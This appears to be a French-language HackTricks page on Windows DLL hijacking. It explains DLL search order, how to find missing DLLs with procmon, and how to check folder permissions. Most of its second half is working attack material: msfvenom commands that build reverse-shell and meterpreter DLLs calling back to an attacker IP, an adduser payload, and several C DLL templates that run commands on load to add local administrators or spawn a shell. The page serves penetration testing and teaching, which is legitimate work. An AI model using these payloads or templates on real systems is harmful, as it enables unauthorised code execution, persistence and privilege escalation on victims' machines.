# Dll Hijacking

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière en hacking** et par hacker l'inviolable - **nous recrutons !** (_polonais courant écrit et parlé requis_).

{% embed url="https://www.stmcyber.com/careers" %}

## Définition

Tout d'abord, clarifions la définition. Le Dll hijacking consiste, au sens large, à **tromper une application légitime/de confiance pour qu'elle charge un DLL arbitraire**. Des termes tels que _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ et _DLL Side-Loading_ sont souvent - à tort - utilisés pour dire la même chose.

Le Dll hijacking peut être utilisé pour **exécuter** du code, obtenir de la **persistance** et **escalader des privilèges**. Parmi ces trois objectifs, le **moins probable** à trouver est de loin l'**escalade de privilèges**. Cependant, comme cela fait partie de la section sur l'escalade de privilèges, je me concentrerai sur cette option. Notez également que, indépendamment de l'objectif, un Dll hijacking est réalisé de la même manière.

### Types

Il existe une **variété d'approches** à choisir, le succès dépendant de la manière dont l'application est configurée pour charger ses DLL requis. Les approches possibles incluent :

1. **Remplacement de DLL** : remplacer un DLL légitime par un DLL malveillant. Cela peut être combiné avec le _DLL Proxying_ \[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)], qui garantit que toutes les fonctionnalités du DLL original restent intactes.
2. **Hijacking de l'ordre de recherche de DLL** : les DLL spécifiés par une application sans chemin sont recherchés dans des emplacements fixes dans un ordre spécifique \[[3](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)]. Le détournement de l'ordre de recherche se fait en plaçant le DLL malveillant dans un emplacement qui est recherché avant le DLL réel. Cela inclut parfois le répertoire de travail de l'application cible.
3. **Phantom DLL hijacking** : déposer un DLL malveillant à la place d'un DLL manquant/non-existant qu'une application légitime essaie de charger \[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)].
4. **Redirection de DLL** : changer l'emplacement dans lequel le DLL est recherché, par exemple en modifiant la variable d'environnement `%PATH%`, ou les fichiers `.exe.manifest` / `.exe.local` pour inclure le dossier contenant le DLL malveillant \[[5](https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests), [6](https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection)].
5. **Remplacement de DLL WinSxS** : remplacer le DLL légitime par le DLL malveillant dans le dossier WinSxS pertinent du DLL ciblé. Souvent désigné comme DLL side-loading \[[7](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)].
6. **Hijacking de DLL par chemin relatif** : copier (et éventuellement renommer) l'application légitime dans un dossier accessible en écriture par l'utilisateur, aux côtés du DLL malveillant. De la manière dont cela est utilisé, cela a des similitudes avec l'exécution de proxy binaire (signé) \[[8](https://attack.mitre.org/techniques/T1218/)]. Une variation de cela est (appelée quelque peu oxymoroniquement) ‘_apportez votre propre LOLbin_’ \[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)] dans laquelle l'application légitime est apportée avec le DLL malveillant (plutôt que copiée de l'emplacement légitime sur la machine de la victime).

## Trouver les Dlls manquants

La manière la plus courante de trouver des Dlls manquants dans un système est d'exécuter [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, en **définissant** les **deux filtres suivants** :

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

et afficher uniquement l'**Activité du système de fichiers** :

![](<../../.gitbook/assets/image (314).png>)

Si vous recherchez des **Dlls manquants en général**, vous **laissez** cela fonctionner pendant quelques **secondes**.\
Si vous recherchez un **Dll manquant dans un exécutable spécifique**, vous devez définir **un autre filtre comme "Nom du processus" "contient" "\<nom de l'exécutable>", l'exécuter et arrêter la capture d'événements**.

## Exploiter les Dlls manquants

Pour escalader les privilèges, la meilleure chance que nous avons est de pouvoir **écrire un Dll qu'un processus privilégié essaiera de charger** dans un **endroit où il sera recherché**. Par conséquent, nous serons en mesure d'**écrire** un Dll dans un **dossier** où le **Dll est recherché avant** le dossier où le **Dll original** est (cas étrange), ou nous serons en mesure d'**écrire dans un dossier où le Dll sera recherché** et le Dll original **n'existe pas** dans aucun dossier.

### Ordre de recherche de Dll

**Dans la** [**documentation de Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **vous pouvez trouver comment les Dlls sont chargés spécifiquement.**

En général, une **application Windows** utilisera des **chemins de recherche prédéfinis pour trouver les Dlls** et vérifiera ces chemins dans un ordre spécifique. Le Dll hijacking se produit généralement en plaçant un Dll malveillant dans l'un de ces dossiers tout en s'assurant que le Dll est trouvé avant le légitime. Ce problème peut être atténué en faisant spécifier à l'application des chemins absolus pour les Dlls dont elle a besoin.

Vous pouvez voir l'**ordre de recherche de Dll sur les systèmes 32 bits** ci-dessous :

1. Le répertoire à partir duquel l'application a été chargée.
2. Le répertoire système. Utilisez la fonction [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) pour obtenir le chemin de ce répertoire. (_C:\Windows\System32_)
3. Le répertoire système 16 bits. Il n'existe aucune fonction qui obtient le chemin de ce répertoire, mais il est recherché. (_C:\Windows\System_)
4. Le répertoire Windows. Utilisez la fonction [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) pour obtenir le chemin de ce répertoire.
1. (_C:\Windows_)
5. Le répertoire courant.
6. Les répertoires qui sont listés dans la variable d'environnement PATH. Notez que cela n'inclut pas le chemin par application spécifié par la clé de registre **App Paths**. La clé **App Paths** n'est pas utilisée lors du calcul du chemin de recherche de Dll.

C'est l'**ordre de recherche par défaut** avec **SafeDllSearchMode** activé. Lorsqu'il est désactivé, le répertoire courant passe en deuxième position. Pour désactiver cette fonctionnalité, créez la valeur de registre **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** et réglez-la sur 0 (activé par défaut).

Si la fonction [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) est appelée avec **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, la recherche commence dans le répertoire du module exécutable que **LoadLibraryEx** charge.

Enfin, notez qu'**un Dll pourrait être chargé en indiquant le chemin absolu au lieu du nom seulement**. Dans ce cas, ce Dll est **uniquement recherché dans ce chemin** (si le Dll a des dépendances, elles seront recherchées comme si elles étaient chargées uniquement par leur nom).

Il existe d'autres moyens de modifier l'ordre de recherche, mais je ne vais pas les expliquer ici.

#### Exceptions à l'ordre de recherche de Dll d'après les docs Windows

* Si un **Dll avec le même nom de module est déjà chargé en mémoire**, le système vérifie uniquement la redirection et un manifeste avant de résoudre au Dll chargé, peu importe dans quel répertoire il se trouve. **Le système ne recherche pas le Dll**.
* Si le Dll figure sur la liste des **Dll connus** pour la version de Windows sur laquelle l'application s'exécute, le **système utilise sa copie du Dll connu** (et les Dll dépendants du Dll connu, le cas échéant) **au lieu de rechercher** le Dll. Pour une liste des Dll connus sur le système actuel, voir la clé de registre suivante : **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**.
* Si un **Dll a des dépendances**, le système **recherche** les Dll dépendants comme s'ils étaient chargés avec juste leurs **noms de module**. Cela est vrai **même si le premier Dll a été chargé en spécifiant un chemin complet**.

### Escalader les privilèges

**Prérequis** :

* **Trouver un processus** qui s'exécute/sera exécuté avec **d'autres privilèges** (mouvement horizontal/lateral) qui **manque d'un Dll**.
* Avoir des **droits d'écriture** sur n'importe quel **dossier** où le **Dll** va être **recherché** (probablement le répertoire exécutable ou un dossier dans le chemin système).

Oui, les prérequis sont compliqués à trouver car **par défaut, il est plutôt rare de trouver un exécutable privilégié manquant d'un Dll** et il est encore **plus rare d'avoir des droits d'écriture sur un dossier du chemin système** (ce n'est pas possible par défaut). Mais, dans des environnements mal configurés, cela est possible.\
Dans le cas où vous avez de la chance et que vous vous trouvez dans les conditions requises, vous pourriez consulter le projet [UACME](https://github.com/hfiref0x/UACME). Même si le **but principal du projet est de contourner l'UAC**, vous pouvez y trouver un **PoC** d'un Dll hijacking pour la version de Windows que vous pouvez utiliser (probablement en changeant simplement le chemin du dossier où vous avez des droits d'écriture).

Notez que vous pouvez **vérifier vos permissions dans un dossier** en faisant :
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Et **vérifiez les permissions de tous les dossiers dans PATH** :
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vous pouvez également vérifier les importations d'un exécutable et les exportations d'une dll avec :
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Pour un guide complet sur la manière d'**abuser du Dll Hijacking pour escalader les privilèges** avec des permissions d'écriture dans un **dossier du chemin système**, consultez :

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Outils automatisés

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) vérifiera si vous avez des permissions d'écriture dans un dossier à l'intérieur du chemin système.\
D'autres outils automatisés intéressants pour découvrir cette vulnérabilité sont les **fonctions PowerSploit** : _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ et _Write-HijackDll_.

### Exemple

Si vous trouvez un scénario exploitable, l'une des choses les plus importantes pour l'exploiter avec succès serait de **créer une dll qui exporte au moins toutes les fonctions que l'exécutable importera de celle-ci**. Notez cependant que le Dll Hijacking est pratique pour [escalader du niveau d'intégrité Moyen à Élevé **(contournant l'UAC)**](../authentication-credentials-uac-and-efs.md#uac) ou du [**niveau d'intégrité Élevé à SYSTEM**](./#from-high-integrity-to-system)**.** Vous pouvez trouver un exemple de **comment créer une dll valide** dans cette étude sur le hijacking de dll axée sur le détournement de dll pour l'exécution : [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
De plus, dans la **section suivante**, vous trouverez des **codes de dll de base** qui pourraient être utiles comme **modèles** ou pour créer une **dll avec des fonctions non requises exportées**.

## **Création et compilation de Dlls**

### **Dll Proxifying**

En gros, un **proxy Dll** est une Dll capable d'**exécuter votre code malveillant lors du chargement** mais aussi d'**exposer** et de **fonctionner** comme **attendu** en **relayant tous les appels à la vraie bibliothèque**.

Avec l'outil \*\*\*\* [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) \*\*\*\* ou \*\*\*\* [**Spartacus**](https://github.com/Accenture/Spartacus) \*\*\*\*, vous pouvez en fait **indiquer un exécutable et sélectionner la bibliothèque** que vous souhaitez proxifier et **générer une dll proxifiée** ou **indiquer la Dll** et **générer une dll proxifiée**.

### **Meterpreter**

**Obtenir un shell inversé (x64) :**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtenez un meterpreter (x86) :**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Créer un utilisateur (x86, je n'ai pas vu de version x64) :**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Votre propre version

Notez que dans plusieurs cas, la Dll que vous compilez doit **exporter plusieurs fonctions** qui seront chargées par le processus victime. Si ces fonctions n'existent pas, le **binaire ne pourra pas les charger** et l'**exploit échouera**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
```markdown
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous êtes intéressé par une **carrière en hacking** et pirater l'impénétrable - **nous recrutons !** (_maîtrise du polonais écrit et parlé requise_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous voulez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous accéder à la **dernière version du PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de hacking en soumettant des PR au** [**dépôt hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**dépôt hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
